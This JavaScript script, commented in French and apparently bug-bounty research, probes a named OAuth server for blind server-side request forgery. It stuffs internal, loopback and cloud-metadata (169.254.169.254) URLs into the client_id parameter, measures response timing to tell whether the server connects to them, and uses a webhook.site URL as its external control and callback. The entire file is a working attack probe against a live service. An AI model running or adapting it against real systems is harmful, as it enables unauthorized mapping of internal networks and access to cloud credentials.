const AS = "https://bugsecure-api.senintel.sn";
const UUID = "3ef992c0-b173-407f-ab55-e3ea613a534a";
const BASE = "https://webhook.site/" + UUID;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const F = async (u, o = {}) => { for (let a = 0; a < 3; a++) { try { return await fetch(u, { ...o, signal: AbortSignal.timeout(25000) }); } catch (e) { await sleep(2500); } } return null; };

// Mesure en DISTRIBUTION : le filtre d adresses agit-il AVANT ou APRES la tentative de connexion ?
const TARGETS = [
  ["temoin externe (webhook)", (t) => BASE + "/dist-" + t],
  ["temoin non routable 192.0.2.1", (t) => "http://192.0.2.1/dist-" + t],
  ["prive 10.255.255.1", (t) => "http://10.255.255.1/dist-" + t],
  ["IMDS 169.254.169.254", (t) => "http://169.254.169.254/dist-" + t],
  ["loopback 127.0.0.1:80", (t) => "http://127.0.0.1/dist-" + t],
  ["loopback 127.0.0.1:3000", (t) => "http://127.0.0.1:3000/dist-" + t],
  ["loopback 127.0.0.1:53682", (t) => "http://127.0.0.1:53682/dist-" + t],
  ["loopback 127.0.0.1:9200", (t) => "http://127.0.0.1:9200/dist-" + t],
];
const N = 8;
const stats = {};
for (const [name, build] of TARGETS) {
  const ts = [];
  for (let i = 0; i < N; i++) {
    const u = AS + "/oauth/authorize?response_type=code&client_id=" + encodeURIComponent(build(TS())) + "&redirect_uri=" + encodeURIComponent(BASE + "/cb") + "&scope=programs%3Aread&state=bb&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256&resource=" + encodeURIComponent(AS);
    const t0 = Date.now();
    const r = await F(u, { redirect: "manual" });
    if (r) { await r.text(); ts.push(Date.now() - t0); }
    await sleep(4200);
  }
  ts.sort((a, b) => a - b);
  const q = (p) => ts[Math.min(ts.length - 1, Math.floor(ts.length * p))];
  stats[name] = { min: ts[0], p25: q(0.25), med: q(0.5), p75: q(0.75), max: ts[ts.length - 1], all: ts };
  console.log("  " + name.padEnd(32) + "min=" + String(ts[0]).padStart(6) + " p25=" + String(q(0.25)).padStart(6) + " med=" + String(q(0.5)).padStart(6) + " p75=" + String(q(0.75)).padStart(6) + " max=" + String(ts[ts.length - 1]).padStart(6) + "  [" + ts.join(",") + "]");
}
function TS() { return Date.now() + "-" + Math.random().toString(36).slice(2, 7); }
console.log("\n=== lecture ===");
const ext = stats["temoin externe (webhook)"];
for (const [name, s] of Object.entries(stats)) {
  if (name.startsWith("temoin")) continue;
  const slow = s.all.filter((x) => x > 1500).length;
  console.log("  " + name.padEnd(32) + "samples > 1500 ms : " + slow + "/" + s.all.length + (slow >= 2 ? "   <<< REPARTITION BIMODALE (tentative de connexion puis filtre ?)" : ""));
}
console.log("\n  (temoin externe : " + ext.all.filter((x) => x > 1500).length + "/" + ext.all.length + " au-dela de 1500 ms)");
